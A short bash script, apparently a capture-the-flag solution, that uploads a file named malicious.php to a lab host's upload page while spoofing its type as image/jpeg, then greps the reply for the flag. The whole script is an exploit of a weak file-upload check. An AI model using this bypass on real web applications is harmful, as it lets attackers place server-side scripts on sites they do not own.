#!/bin/bash

touch malicious.php

ip=192.168.86.43

curl -F "uploaded=@malicious.php;type=image/jpeg" -F Upload=Upload "http://$ip/?page=upload" | grep "flag"
